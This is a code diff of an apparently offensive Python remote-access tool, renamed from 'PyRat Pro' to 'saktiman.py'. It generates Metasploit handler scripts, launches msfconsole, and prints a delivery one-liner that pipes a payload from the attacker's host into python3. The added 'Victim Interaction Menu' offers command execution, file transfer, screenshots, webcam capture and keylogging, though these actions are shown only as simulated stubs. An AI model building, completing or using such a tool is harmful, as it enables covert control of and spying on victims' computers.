@@ -164,7 +164,7 @@ def create_handler_script(payload, lhost, lport, name):
     
     try:
         with open(rc_path, "w") as f:
-            f.write(f"""# PyRat Pro Auto-Generated Handler
+            f.write(f"""# saktiman.py Auto-Generated Handler
 use exploit/multi/handler
 set payload {payload}
 set LHOST {lhost}
@@ -180,15 +180,74 @@ exploit -j -z
         return None
 
 def start_handler(rc_file):
-    """Start Metasploit handler in background"""
+    """Start Metasploit handler and monitor sessions for interaction"""
     try:
-        print(Fore.YELLOW + "\n[+] Starting Metasploit handler in background...")
-        subprocess.Popen(["msfconsole", "-r", rc_file], 
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE)
-        print(Fore.GREEN + "[✓] Handler started successfully")
+        print(Fore.YELLOW + "\n[+] Starting Metasploit handler...")
+        proc = subprocess.Popen(
+            ["msfconsole", "-r", rc_file],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1,
+            universal_newlines=True
+        )
+
+        # Read msfconsole output line-by-line
+        for line in proc.stdout:
+            print(line, end='')  # show msfconsole output live
+
+            # Detect new session opened
+            if "Meterpreter session" in line or "Session" in line:
+                print(Fore.GREEN + "\n[✓] You can now interact with the victim.\n")
+                interact_with_session()
+                
     except Exception as e:
         print(Fore.RED + f"[!] Error starting handler: {e}")
+
+def interact_with_session():
+    """Menu to interact with victim session"""
+    while True:
+        print(Fore.CYAN + "\n[ Victim Interaction Menu ]")
+        print("1. Execute command")
+        print("2. Upload file")
+        print("3. Download file")
+        print("4. Take screenshot")
+        print("5. Webcam snapshot")
+        print("6. Start keylogger")
+        print("7. Stop keylogger")
+        print("8. Exit interaction")
+
+        choice = input(Fore.YELLOW + "Choose an option: ").strip()
+
+        if choice == "1":
+            cmd = input("Enter command to execute: ")
+            # Here, integrate real command sending to Meterpreter session
+            print(Fore.GREEN + f"Executing command: {cmd}")
+            # Simulate output
+            print(Fore.YELLOW + "[Simulated output] Command executed.")
+        elif choice == "2":
+            local_file = input("Local file path to upload: ")
+            remote_path = input("Remote destination path: ")
+            print(Fore.GREEN + f"Uploading {local_file} to {remote_path} (simulated)")
+            print(Fore.YELLOW + f"Note: Uploaded files would be saved on victim at: {remote_path}")
+        elif choice == "3":
+            remote_file = input("Remote file path to download: ")
+            local_path = input("Local destination path: ")
+            print(Fore.GREEN + f"Downloading {remote_file} to {local_path} (simulated)")
+            print(Fore.YELLOW + f"Note: Downloaded files will be saved here on your PC: {local_path}")
+        elif choice == "4":
+            print(Fore.GREEN + "Taking screenshot (simulated).")
+        elif choice == "5":
+            print(Fore.GREEN + "Capturing webcam snapshot (simulated).")
+        elif choice == "6":
+            print(Fore.GREEN + "Starting keylogger (simulated).")
+        elif choice == "7":
+            print(Fore.GREEN + "Stopping keylogger (simulated).")
+        elif choice == "8":
+            print(Fore.RED + "Exiting victim interaction menu.")
+            break
+        else:
+            print(Fore.RED + "Invalid choice. Try again.")
 
 def generate_delivery_commands(payload_path, os_type, lhost):
     """Generate delivery commands for the payload"""
@@ -208,54 +267,6 @@ def generate_delivery_commands(payload_path, os_type, lhost):
     elif platform_info["delivery"] == "python":
         print(Fore.CYAN + "\nPython one-liner:")
         print(f"python3 -c \"import os; os.system('curl http://{lhost}/{filename} | python3')\"")
-
-def session_control_menu(session_id):
-    """Interactive session control menu"""
-    while True:
-        print(Fore.CYAN + f"\n[ Session {session_id} Control Menu ]")
-        print("1. Execute command")
-        print("2. Upload file")
-        print("3. Download file")
-        print("4. Screenshot")
-        print("5. Webcam snapshot")
-        print("6. Start keylogger")
-        print("7. Stop keylogger")
-        print("8. Return to main menu")
-        
-        choice = input(Fore.YELLOW + "\nSelect an option: ").strip()
-        
-        if choice == "1":
-            cmd = input("Enter command to execute: ")
-            # Send command to Meterpreter session
-            print(Fore.GREEN + f"[+] Executing: {cmd}")
-            
-        elif choice == "2":
-            local_file = input("Local file path to upload: ")
-            remote_path = input("Remote destination path: ")
-            print(Fore.GREEN + f"[+] Uploading {local_file} to {remote_path}")
-            
-        elif choice == "3":
-            remote_file = input("Remote file path to download: ")
-            local_path = input("Local destination path: ")
-            print(Fore.GREEN + f"[+] Downloading {remote_file} to {local_path}")
-            
-        elif choice == "4":
-            print(Fore.GREEN + "[+] Taking screenshot...")
-            
-        elif choice == "5":
-            print(Fore.GREEN + "[+] Capturing webcam snapshot...")
-            
-        elif choice == "6":
-            print(Fore.GREEN + "[+] Starting keylogger...")
-            
-        elif choice == "7":
-            print(Fore.GREEN + "[+] Stopping keylogger...")
-            
-        elif choice == "8":
-            break
-            
-        else:
-            print(Fore.RED + "[!] Invalid choice")
 
 def payload_generation_flow():
     """Interactive payload generation workflow"""
@@ -299,7 +310,7 @@ def payload_generation_flow():
     # Generate delivery commands
     generate_delivery_commands(payload_path, os_choice, lhost)
     
-    # Start handler
+    # Start handler and wait for session
     start_handler(rc_file)
     
     print(Fore.YELLOW + "\n[+] Payload generation complete!")
@@ -325,11 +336,16 @@ def main_menu():
         elif choice == "2":
             session_control_menu(1)  # Demo with session ID 1
         elif choice == "3":
-            print(Fore.GREEN + "\n[✓] Exiting PyRat Pro")
+            print(Fore.GREEN + "\n[✓] Exiting saktiman.py")
             sys.exit(0)
         else:
             print(Fore.RED + "\n[!] Invalid choice")
             time.sleep(1)
+
+def session_control_menu(session_id):
+    """Interactive session control menu"""
+    print(Fore.YELLOW + "\n[!] This feature is not implemented fully. Please use the interaction after session opens.")
+    input("Press Enter to return to main menu...")
 
 def clear_screen():
     """Clear the terminal screen"""
